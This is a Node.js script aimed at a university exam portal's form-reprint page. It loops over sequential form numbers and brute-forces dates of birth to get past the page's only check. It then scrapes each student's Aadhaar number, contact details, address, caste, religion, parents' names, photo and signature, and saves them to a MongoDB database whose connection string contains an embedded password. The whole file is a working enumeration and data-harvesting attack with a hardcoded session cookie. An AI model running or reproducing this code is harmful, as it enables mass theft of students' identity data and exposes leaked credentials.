const cheerio = require('cheerio');
const fs = require('fs');
const axios = require('axios');
const mongoose = require('mongoose');



const dbUrl = 'mongodb+srv://kamleshksks456:LtnGz4tLIcrsYj0j@cluster0.shgns95.mongodb.net/forms';
mongoose.connect(dbUrl, { useNewUrlParser: true, useUnifiedTopology: true })
    .then(() => console.log('Connected to MongoDB'))
    .catch((error) => console.error('MongoDB connection error:', error));

const Schema = mongoose.Schema;
const blogPostSchema = new Schema({
    imgSrcSign: String, imgSrc: String, rollNo: String,
    formNo: String, aadharNo: String, email: String, address: String, mobile: String, dob: String,
    abcId: String, gender: String, religion: String, caste: String, course: String, college: String,
    fatherName: String, motherName: String, studentName: String, date: { type: Date, default: Date.now }
});

const BlogPost = mongoose.model('BlogPost', blogPostSchema);

const logFile = 'log.txt';
let fulfilled = false;

function log(message) {
    fs.appendFile(logFile, `${new Date()} - ${message}\n`, (err) => {
        if (err) {
            console.error(err);
        }
    });
}

function generateDaysOfMonth(month, year) {
    const daysInMonth = new Date(year, month, 0).getDate();
    const days = [];

    for (let day = 1; day <= daysInMonth; day++) {
        const dayString = day.toString().padStart(2, '0');
        days.push(dayString);
    }
    return days;
}

async function findOne(formNo, year, month, date) {
    try {
        let html = "";
        try {
            const response = await axios.get('https://exam.shekhauniexam.in/Reprint_Login.aspx', {
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Sec-CH-UA': '"Not/A)Brand";v="8", "Chromium";v="126", "Brave";v="126"',
                    'Sec-CH-UA-Mobile': '?1',
                    'Sec-CH-UA-Platform': '"Android"',
                    'Upgrade-Insecure-Requests': '1',
                    Referer: 'https://exam.shekhauniexam.in/Reprint_Login.aspx',
                    'Referrer-Policy': 'strict-origin-when-cross-origin'
                }
            });
            const htm = response.data;
            html = htm;
        } catch (error) {
            console.log(error);
            console.error("error  " + formNo + " year " + year + " month " + month + " date " + date);
            return findOne(formNo, year, month, date);
        }

        let $ = cheerio.load(html);
        let viewState = $('#__VIEWSTATE').val();
        let viewStateGenerator = $('#__VIEWSTATEGENERATOR').val();
        let eventValidation = $('#__EVENTVALIDATION').val();
        viewState = encodeURIComponent(viewState);
        viewStateGenerator = encodeURIComponent(viewStateGenerator);
        eventValidation = encodeURIComponent(eventValidation);

        try {
            const response = await axios.post('https://exam.shekhauniexam.in/Reprint_Login.aspx',
                `__VIEWSTATE=${viewState}&__VIEWSTATEGENERATOR=${viewStateGenerator}&__EVENTVALIDATION=${eventValidation}&ctl00%24ContentPlaceHolder1%24txtfrmrefno=${formNo}&ctl00%24ContentPlaceHolder1%24txtdob=${year}-${month}-${date}&ctl00%24ContentPlaceHolder1%24btnstatus=Check+Status`,
                {
                    headers: {
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                        'Accept-Language': 'en-US,en;q=0.9',
                        'Cache-Control': 'ax-age=0',
                        'Content-Type': 'application/x-www-form-urlencoded',
                        'Priority': 'u=0, i',
                        'Sec-CH-UA': '"Not/A)Brand";v="8", "Chromium";v="126", "Brave";v="126"',
                        'Sec-CH-UA-Mobile': '?1',
                        'Sec-CH-UA-Platform': '"Android"',
                        'Sec-Fetch-Dest': 'document',
                        'Sec-Fetch-Mode': 'navigate',
                        'Sec-Fetch-Site': 'ame-origin',
                        'Sec-Fetch-User': '?1',
                        'Sec-GPC': '1',
                        'Upgrade-Insecure-Requests': '1',
                        'Cookie': 'ASP.NET_SessionId=vrugvbttiwmlj5ukxzg31035',
                        'Referer': 'https://exam.shekhauniexam.in/Reprint_Login.aspx',
                        'Referrer-Policy': 'trict-origin-when-cross-origin'
                    }
                }
            );
            const resultt = response.data;
            html = resultt
        } catch (error) {
            console.log(error);
            console.error("error  " + formNo + " year " + year + " month " + month + " date " + date);
            return findOne(formNo, year, month, date);
        }

        $ = cheerio.load(html);
        const inputElement = $('#ContentPlaceHolder1_btnreprint');
        if (!inputElement.val()) {
            console.log("Not found  " + formNo + " year " + year + " month " + month + " date " + date)
            return false;
        }

        viewState = $('#__VIEWSTATE').val();
        viewStateGenerator = $('#__VIEWSTATEGENERATOR').val();
        eventValidation = $('#__EVENTVALIDATION').val();
        viewState = encodeURIComponent(viewState);
        viewStateGenerator = encodeURIComponent(viewStateGenerator);
        eventValidation = encodeURIComponent(eventValidation);

        try {
            const response = await axios.post("https://exam.shekhauniexam.in/Reprint_Login.aspx",
                `__VIEWSTATE=${viewState}&__VIEWSTATEGENERATOR=${viewStateGenerator}&__EVENTVALIDATION=${eventValidation}&ctl00%24ContentPlaceHolder1%24txtfrmrefno=&ctl00%24ContentPlaceHolder1%24txtdob=&ctl00%24ContentPlaceHolder1%24btnreprint=Reprint+Form`,
                {
                    headers: {
                        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
                        "accept-language": "en-US,en;q=0.9",
                        "cache-control": "max-age=0",
                        "content-type": "application/x-www-form-urlencoded",
                        "priority": "u=0, i",
                        "sec-ch-ua": "\"Not/A)Brand\";v=\"8\", \"Chromium\";v=\"126\", \"Brave\";v=\"126\"",
                        "sec-ch-ua-mobile": "?1",
                        "sec-ch-ua-platform": "\"Android\"",
                        "sec-fetch-dest": "document",
                        "sec-fetch-mode": "navigate",
                        "sec-fetch-site": "same-origin",
                        "sec-fetch-user": "?1",
                        "sec-gpc": "1",
                        "upgrade-insecure-requests": "1",
                        "cookie": "ASP.NET_SessionId=vrugvbttiwmlj5ukxzg31035",
                        "Referer": "https://exam.shekhauniexam.in/Reprint_Login.aspx",
                        "Referrer-Policy": "strict-origin-when-cross-origin"
                    }
                }
            );
            html = response.data;
        } catch (error) {
            console.log(error);
            console.error("error  " + formNo + " year " + year + " month " + month + " date " + date);
            return findOne(formNo, year, month, date);
        }

        $ = cheerio.load(html);
        const courseText = $('#lblcourse').text();
        const collegeText = $('#lblcollege').text();
        const studentName = $('td').find('span#lblname').text();
        const fatherNameText = $('#lblfname').text();
        const motherNameText = $('#lblmname').text();
        const casteText = $('#lblcast').text();
        const religionText = $('#lblreligion').text();
        const genderText = $('#lblgender').text();
        const abcId = $('#lbl_ABCID').text();
        const dob = $('#lbldob').text();
        const mobile = $('#lblmobile').text();
        const address = $('#lbladdess').text();
        const email = $('#lblEmail').text();
        const aadharNo = $('#lblAadharNo').text();
        const formNoo = $('#lblformno').text();
        const rollNoo = $('#lblrollno').text();
        const imgSrc = $('#ImgPhoto').attr('src');
        const imgSrcSign = $('#ImgSign').attr('src');

        const blogPost = new BlogPost({
            imgSrcSign: imgSrcSign, imgSrc: imgSrc, rollNo: rollNoo,
            formNo: formNoo, aadharNo: aadharNo, email: email, address: address,
            mobile: mobile, dob: dob, abcId: abcId, gender: genderText,
            religion: religionText, caste: casteText, course: courseText,
            college: collegeText, fatherName: fatherNameText, motherName: motherNameText,
            studentName: studentName
        });
        await blogPost.save();

        console.log({
            imgSrcSign, imgSrc, rollNoo, formNoo,
            aadharNo, email, address, mobile, dob, abcId, genderText,
            religionText, casteText, courseText, collegeText, fatherNameText,
            motherNameText, studentName
        });

        log("found  " + formNo + " year " + year + " month " + month + " date " + date)
        return true;
    }
    catch (error) {
        console.log(error);
    }
}

async function findOneMonth(formNo, year, month) {
    try {
        const days = generateDaysOfMonth(month, year);
        let count = 0;
        async function currentDay(date, month, year) {
            if (count >= days.length - 1) {
                return;
            }
            let isTaskTrue = await findOne(formNo, year, month, date);
            if (isTaskTrue) {
                fulfilled = true;
            }
            if (fulfilled) {
                return;
            }
            return currentDay(days[++count], month, year);
        }
        await currentDay(days[count], month, year);
    }
    catch {
        console.log(error);
    }
    return;
}

async function findOneYear(formNo, year) {
    try {
        const rollNumbersPart1 = Array.from({ length: 12 }, (_, i) => `${i + 1}`);
        await Promise.all(rollNumbersPart1.map(month => findOneMonth(formNo, year, month)));
    }
    catch (error) {
        console.log(error);
    }
    return;
}



async function loop() {
    let fn = 240382667;
    let yy = [2004, 2005, 2003, 2006, 2002, 2007, 2001, 2000, 2008, 2009];
    let c = 0;

    while (true) {
        console.log("loop runned");
        await findOneYear(fn, yy[c]);
        if (fulfilled) {
            fn++;
            c = 0;
            fulfilled = false;
            continue;
        }
        else {
            if (yy[c] == 2009) {
                fn++;
                c = 0;
            }
            else {
                c++;
            }
        }
    }
}

loop()



// findOneYear(240382647,2005).then((e)=> console.log(e));
// findOneMonth(240382647,2005,9).then((e)=> console.log(e));
